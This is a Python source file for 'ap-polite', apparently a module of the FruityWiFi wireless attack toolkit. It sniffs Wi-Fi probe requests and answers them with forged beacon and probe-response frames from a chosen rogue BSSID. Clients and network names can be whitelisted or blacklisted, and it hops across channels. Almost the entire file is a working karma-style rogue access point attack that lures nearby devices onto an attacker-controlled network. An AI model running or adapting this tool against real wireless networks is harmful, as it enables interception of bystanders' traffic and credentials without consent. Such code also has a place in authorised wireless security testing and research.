#!/usr/bin/env python

import time
import sys, getopt
import traceback
from multiprocessing import Process
import signal
import threading

from scapy.all import *

# spoof-response.py
# ------- MENU -------
def usage():
    print "\nap-polite 1.0 by xtr4nge"
    
    print "Usage: ap-polite.py <options>\n"
    print "Options:"
    print "-i <i>, --interface=<i>                  set interface (default: mon0)"
    print "-t <time>, --time=<time>                 scan time (default: 5s)"
    print "-s <filter-station>                      station filter (none, whitelist, blacklist)"
    print "-e <filter-essid>                        essid filter (none, whitelist, blacklist)"
    print "-b <bssid>                               Rogue AP (bssid)"
    print "-h                                       Print this help message."
    print ""
    print "Author: xtr4nge"
    print ""

def parseOptions(argv):
    INTERFACE = "mon0"
    TIME =  int(0)
    LOG = ""
    FILTER_STATION = "none"
    FILTER_SSID = "none"
    ROGUE_AP = "00:00:00:00:00:01"

    try:
        opts, args = getopt.getopt(argv, "hi:t:l:s:e:b:",
                                   ["help", "interface=", "time=", "log=", "station=", "essid=", "bssid="])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-i", "--interface"):
                INTERFACE = arg
            elif opt in ("-t", "--time"):
                TIME = int(arg)
            elif opt in ("-l", "--log"):
                LOG = arg
                with open(LOG, 'w') as f:
                    f.write("")
            elif opt in ("-s", "--station"):
                FILTER_STATION = arg
            elif opt in ("-e", "--essid"):
                FILTER_SSID = arg
            elif opt in ("-b", "--bssid"):
                ROGUE_AP = arg

        return (INTERFACE, TIME, LOG, FILTER_STATION, FILTER_SSID, ROGUE_AP)
                    
    except getopt.GetoptError:           
        usage()
        sys.exit(2) 

# -------------------------
# GLOBAL VARIABLES
# -------------------------
desc = {
        4: "Probe Request",
        5: "Probe Response",
        13: "Acknowledgement",
        8: "Beacon Frame",
    }

observedclients = []

INVENTORY = {}
EXCLUDE = [None, "00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"]
aps = {}
(INTERFACE, TIME, LOG, FILTER_STATION, FILTER_SSID, ROGUE_AP) = parseOptions(sys.argv[1:])

CLIENT = []
#FILTER_SSID = "blacklist" # whitelist,blacklist,none
#FILTER_CLIENT = "whitelist" # whitelist,blacklist,none

FILTER_CLIENT = FILTER_STATION

FILTER_SSID_LIST = []
FILTER_CLIENT_LIST = []

TEMP = "/usr/share/fruitywifi/conf/pool-ssid.conf"
with open(TEMP) as file:
    for line in file:
        FILTER_SSID_LIST.append(line.strip())
        
TEMP = "/usr/share/fruitywifi/conf/pool-station.conf"
with open(TEMP) as file:
    for line in file:
        FILTER_CLIENT_LIST.append(line.strip())

BSSID = ROGUE_AP

# START
print "Filter Station: " + FILTER_CLIENT
print "Filter SSID: " + FILTER_SSID
print FILTER_SSID_LIST
print FILTER_CLIENT_LIST


def broadcast(CLIENT, ESSID):
    global INTERFACE
    global BSSID
    
    BCAST = "ff:ff:ff:ff:ff:ff"
    
    print "Bcast: ", BSSID, CLIENT, ESSID 
    
    # BROADCAST
    px = RadioTap() / Dot11(addr1 = CLIENT, addr2 = BSSID, addr3 = BSSID)
    px /= Dot11Beacon(cap = 0x0104)
    px /= Dot11Elt(ID=0, info=ESSID)
    px /= Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x0c\x12\x18\x24")
    px /= Dot11Elt(ID=3, info="\x06")
    px /= Dot11Elt(ID=5, info="\x01\x02\x00\x00")
    #p /= Dot11Elt(ID=7, info="\x44\x45\x20\x01\x0d\x14")
    #p /= Dot11Elt(ID=42, info="\x04")
    #p /= Dot11Elt(ID=50, info="\x30\x48\x60\x6c")
    sendp(px, iface=INTERFACE, count = 2, inter = .1)


def probeResponse(CLIENT, ESSID):
    global INTERFACE
    global BSSID
    
    BCAST = "ff:ff:ff:ff:ff:ff"
    
    print "Probe Response: ", BSSID, CLIENT, ESSID 
    
    # BROADCAST
    px = RadioTap() / Dot11(type=0, subtype=5, addr1 = CLIENT, addr2 = BSSID, addr3 = BSSID)
    px /= Dot11Beacon(cap = 0x0104)
    px /= Dot11Elt(ID=0, info=ESSID)
    px /= Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x0c\x12\x18\x24")
    px /= Dot11Elt(ID=3, info="\x06")
    px /= Dot11Elt(ID=5, info="\x01\x02\x00\x00")
    #p /= Dot11Elt(ID=7, info="\x44\x45\x20\x01\x0d\x14")
    #p /= Dot11Elt(ID=42, info="\x04")
    #p /= Dot11Elt(ID=50, info="\x30\x48\x60\x6c")
    sendp(px, iface=INTERFACE, count = 2, inter = .1)

# -------------------------
# SNIFFER
# -------------------------
def sniffmgmt(p):
    global TIME
    global LOG
    global CLIENT
    global FILTER_CLIENT
    global FILTER_CLIENT_LIST
    global FILTER_SSID
    global FILTER_SSID_LIST
    global ROGUE_AP
    
    IP = []
    
    try:
        SIGNAL = ""
        try: SIGNAL = -(256-ord(p.notdecoded[-4:-3]))
        except: pass
        #p = pkt[Dot11Elt]
        cap = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                          "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
        
        BSSID = ""
        SSID, CHANNEL = None, None
        crypto = []
        pDot11Elt = None
        
        try: pDot11Elt= p[Dot11Elt]
        except: pass
        
        while isinstance(pDot11Elt, Dot11Elt):
            BSSID = p[Dot11].addr3

            if pDot11Elt.ID == 0:
                SSID = p.info
            '''
            elif pDot11Elt.ID == 3:
                CHANNEL = ord(pDot11Elt.info)
                #CHANNEL = ""
            elif pDot11Elt.ID == 48:
                crypto.append("WPA2")
            elif pDot11Elt.ID == 221 and pDot11Elt.info.startswith('\x00P\xf2\x01\x01\x00'):
                crypto.append("WPA")
            ''' 
            pDot11Elt = pDot11Elt.payload
        
        if SSID != None and SSID != "" and BSSID not in aps and BSSID not in EXCLUDE:
            #print BSSID, SSID, CHANNEL, crypto, SIGNAL
            aps[BSSID] = [SSID, CHANNEL, crypto, SIGNAL]
        elif BSSID in aps:
            aps[BSSID][3] = SIGNAL
        
        IP.append(str(p.addr1))
        IP.append(str(p.addr2))
        IP.append(str(p.addr3))
        
        # CLIENT, FF: # + SSID (sometimes)
        if p.type == 0 and p.subtype == 4 and ROGUE_AP not in IP:
            #print p.addr2, p.addr3
            CLIENT = p.addr2
            try: SSID = str(p.info)
            except: SSID = ""
            if SSID != "" :
                action = False
                if FILTER_CLIENT == "whitelist" and CLIENT in FILTER_CLIENT_LIST:
                    if FILTER_SSID == "whitelist" and SSID in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "blacklist" and SSID not in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "none": action = True
                    
                elif FILTER_CLIENT == "blacklist" and CLIENT not in FILTER_CLIENT_LIST:
                    if FILTER_SSID == "whitelist" and SSID in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "blacklist" and SSID not in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "none": action = True
                    
                elif FILTER_CLIENT == "none":
                    if FILTER_SSID == "whitelist" and SSID in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "blacklist" and SSID not in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "none": action = True
                    
                if action:
                    #print "Probe Request: ", CLIENT, SSID
                    print "*Probe Request: ", IP, SSID
                    broadcast(CLIENT, SSID)
            return
        
        # CLIENT, BSSID, BSSID # + SSID
        if p.type == 0 and p.subtype == 5 and ROGUE_AP not in IP:
            #print p.addr2, p.addr3
            CLIENT = p.addr1
            BSSID = p.addr3
            try: SSID = str(p.info)
            except: SSID = ""
            
            if SSID != "":
                action = False
                if FILTER_CLIENT == "whitelist" and CLIENT in FILTER_CLIENT_LIST:
                    if FILTER_SSID == "whitelist" and SSID in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "blacklist" and SSID not in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "none": action = True
                    
                elif FILTER_CLIENT == "blacklist" and CLIENT not in FILTER_CLIENT_LIST:
                    if FILTER_SSID == "whitelist" and SSID in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "blacklist" and SSID not in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "none": action = True
                    
                elif FILTER_CLIENT == "none":
                    if FILTER_SSID == "whitelist" and SSID in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "blacklist" and SSID not in FILTER_SSID_LIST: action = True
                    elif FILTER_SSID == "none": action = True
                    
                if action:
                    #print "Probe Response: ", CLIENT, BSSID, SSID
                    print "*Probe Response: ", IP, SSID
                    probeResponse(CLIENT, SSID)
            return
        
        return
            
    except Exception as e:
        pass
        print "** Error: " + str(traceback.format_exc())
        print "-+-+_+-+-"
        #print
    
    
# Channel hopper - This code is very similar to that found in airoscapy.py (http://www.thesprawl.org/projects/airoscapy/)
def channel_hopper(interface):
    while True:
        try:
            channel = random.randrange(1,13)
            os.system("iwconfig %s channel %d" % (interface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break

def stop_channel_hop(signal, frame):
    # set the stop_sniff variable to True to stop the sniffer
    global stop_sniff
    stop_sniff = True
    channel_hop.terminate()
    channel_hop.join()

try:
    channel_hop = Process(target = channel_hopper, args=(INTERFACE,))
    channel_hop.start()
    signal.signal(signal.SIGINT, stop_channel_hop)
    sniff(iface=INTERFACE, prn=sniffmgmt)

except Exception as e:
    print str(e)
    print "Bye ;)"
